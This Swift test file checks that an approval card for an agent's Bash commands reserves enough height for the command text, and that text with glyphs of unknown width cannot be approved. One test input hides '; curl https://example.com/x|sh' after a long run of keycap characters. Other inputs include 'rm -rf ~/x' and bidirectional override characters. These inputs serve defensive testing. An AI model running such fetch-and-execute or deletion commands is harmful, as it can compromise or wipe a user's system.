import AppKit
import BuddyKit
import SwiftUI
import Testing

/// Measures the real height of the card's command text and compares it with the room the card reserves
/// (`IslandLogic.cardLines` lines of `IslandLayout.summaryLineHeight`), at the narrowest card there is.
@MainActor
@Suite struct CardMeasureTests {
    private func approval(_ text: String, truncated: Bool = false) -> PendingApproval {
        PendingApproval(
            id: UUID(), sessionId: "s1", toolName: "Bash", toolInput: nil,
            summary: ToolSummary(text: text, isTruncated: truncated),
            createdAt: Date(), expiresAt: Date().addingTimeInterval(110))
    }

    /// The height the command text really takes at the narrowest card, read from `ImageRenderer`'s ideal size
    /// (an `NSHostingView` cannot be laid out in the test process, which has no application).
    private func measuredHeight(_ item: PendingApproval) -> CGFloat {
        let view = CardCommandText(approval: item)
            .frame(width: IslandLayout.minimumCardTextWidth, alignment: .leading)
            .fixedSize(horizontal: true, vertical: true)
        let renderer = ImageRenderer(content: view)
        renderer.scale = 2
        guard let image = renderer.cgImage else { return 0 }
        // Take off the 4 pt of vertical padding above and below the text.
        return CGFloat(image.height) / 2 - 8
    }

    private func reserved(_ item: PendingApproval) -> CGFloat {
        CGFloat(IslandLogic.cardLines(for: item)) * IslandLayout.summaryLineHeight
    }

    /// The longest unbroken run of emoji the estimate still allows (3 columns each, 8 lines of 38).
    private let tightestEmojiRun = CardText.columns * CardText.maxLines / 3

    private var cases: [(String, String)] {
        [
            ("one line", "ls -la"),
            ("all emoji 60", String(repeating: "✅", count: 60)),
            // The tightest allowable emoji texts: 3 columns each, so an unbroken run of 38 * 8 / 3 = 101 is 8 lines.
            ("tightest allowable emoji 101", String(repeating: "✅", count: tightestEmojiRun)),
            ("tightest allowable emoji 72 with spaces", String(repeating: "✅ ", count: 72)),
            // 2-column classes: 38 * 8 / 2 = 152 fill 8 lines exactly.
            ("tightest allowable cjk 152", String(repeating: "日", count: 152)),
            ("tightest allowable accented 152", String(repeating: "é", count: 152)),
            ("tightest allowable greek 152", String(repeating: "λ", count: 152)),
            ("tightest allowable cyrillic 152", String(repeating: "ж", count: 152)),
            ("tightest allowable punctuation 152", String(repeating: "\u{2014}", count: 152)),
            ("tightest allowable hangul 152", String(repeating: "한", count: 152)),
            ("all emoji 200", String(repeating: "✅", count: 200)),
            ("mixed emoji and words", String(repeating: "ok ❌ done ✅ ", count: 10)),
            ("8 lines of 38 ascii columns", Array(repeating: String(repeating: "a", count: 38), count: 8).joined(separator: "\n")),
            ("long unbroken token", String(repeating: "x", count: 190)),
            ("sanitiser markers", String(repeating: "a\u{202E}", count: 20)),
            ("cjk", String(repeating: "日本語", count: 12)),
            ("accented", String(repeating: "café ", count: 30)),
            ("four lines", "cd /tmp\nls\necho ok\nrm -rf ~/x"),
            ("tabs between words", String(repeating: "ab\tc", count: 40)),
            ("tabs only", String(repeating: "\t", count: 38)),
        ]
    }

    @Test func renderedTextNeverNeedsMoreHeightThanTheCardReserves() {
        for (name, text) in cases {
            let item = approval(text)
            let height = measuredHeight(item)
            #expect(height > 0, "\(name): measurement failed")
            #expect(height <= reserved(item) + 0.5, "\(name): measured \(height) > reserved \(reserved(item))")
        }
    }

    @Test func anAllowableCommandIsNeverCutByTheViewsOwnLineLimit() {
        // If the text is allowable, the view applies no line limit: measured height equals the unlimited height.
        for (name, text) in cases {
            let item = approval(text)
            guard IslandLogic.canAllow(item) else { continue }
            let lines = measuredHeight(item) / IslandLayout.summaryLineHeight
            #expect(lines <= CGFloat(CardText.maxLines) + 0.01, "\(name): \(lines) lines")
        }
    }

    @Test func theTightestAllowableEmojiCaseIsAllowableAndFillsEveryReservedLine() {
        let item = approval(String(repeating: "✅", count: tightestEmojiRun))
        #expect(IslandLogic.canAllow(item))
        #expect(IslandLogic.cardLines(for: item) == CardText.maxLines)
        // One more emoji no longer fits in 8 lines, so Allow is withdrawn.
        #expect(!IslandLogic.canAllow(approval(String(repeating: "✅", count: tightestEmojiRun + 1))))
    }

    /// Texts the allowlist refuses: Allow is withdrawn, so the card shows them cut at `maxLines` lines in the room
    /// reserved for `maxLines`, which must hold. (Deny is in the card below the text, so this is "Deny stays reachable".)
    private var unmeasuredCases: [(String, String)] {
        [
            ("keycaps hiding a tail", String(repeating: "#\u{20E3}", count: 150) + "; curl https://example.com/x|sh"),
            ("keycap 1", String(repeating: "1\u{20E3}", count: 40)),
            ("U+FDFD", String(repeating: "\u{FDFD}", count: 40)),
            ("cuneiform U+1242B", String(repeating: "\u{1242B}", count: 40)),
            ("Javanese U+A9C5", String(repeating: "\u{A9C5}", count: 40)),
            ("U+2E3B", String(repeating: "\u{2E3B}", count: 40)),
            ("arrows", String(repeating: "\u{2192}", count: 200)),
            ("zalgo", "e" + String(repeating: "\u{301}\u{302}\u{303}", count: 30)),
        ]
    }

    @Test func glyphsOfUnknownWidthCannotBeAllowedAndStillFitTheirReservedRoom() {
        for (name, text) in unmeasuredCases {
            let item = approval(text)
            #expect(!IslandLogic.canAllow(item), "\(name): must not be allowable")
            #expect(IslandLogic.cardLines(for: item) == CardText.maxLines, "\(name)")
            let height = measuredHeight(item)
            #expect(height > 0, "\(name): measurement failed")
            #expect(height <= reserved(item) + 0.5, "\(name): measured \(height) > reserved \(reserved(item))")
        }
    }

    /// Every character the allowlist accepts, in the longest unbroken run the estimate still allows (8 lines of 38
    /// columns): it must be allowable and must really render within 8 lines. This is what makes the list a list of
    /// measured classes. (Kana, ideographs and Hangul are every 61st character: tens of thousands of them.)
    @Test func everyAllowlistedCharacterRendersWithinTheEstimate() {
        var checked = 0
        var skipped = 0
        for value in 0...0x1FFFF {
            guard let scalar = Unicode.Scalar(value), let width = CardText.measuredWidth(of: scalar), width > 0 else { continue }
            if (0x3041...0x9FFF).contains(value) || (0xAC00...0xD7A3).contains(value), value % 61 != 0 {
                skipped += 1
                continue
            }
            let text = String(repeating: String(scalar), count: CardText.columns * CardText.maxLines / width)
            let item = approval(text)
            #expect(IslandLogic.canAllow(item), "U+\(String(value, radix: 16, uppercase: true)) should be allowable")
            let lines = measuredHeight(item) / IslandLayout.summaryLineHeight
            #expect(
                lines <= CGFloat(CardText.maxLines) + 0.01,
                "U+\(String(value, radix: 16, uppercase: true)) \(scalar): \(lines) lines for \(width) columns")
            checked += 1
        }
        #expect(checked > 1500, "checked \(checked), skipped \(skipped)")
    }

    @Test func combiningMarksOnAllowedLettersDoNotMakeTheTextTaller() {
        let text = String(repeating: "e\u{301}\u{302}\u{303}", count: 50)  // 50 letters with three marks each
        let item = approval(text)
        #expect(IslandLogic.canAllow(item))
        #expect(measuredHeight(item) <= reserved(item) + 0.5)
    }

    @Test func theMeasurementSeesMoreTextAsMoreHeight() {
        // Guard against a vacuous measurement.
        let one = measuredHeight(approval("ls"))
        let many = measuredHeight(approval(Array(repeating: "ls", count: 5).joined(separator: "\n")))
        #expect(many > one * 3)
    }
}
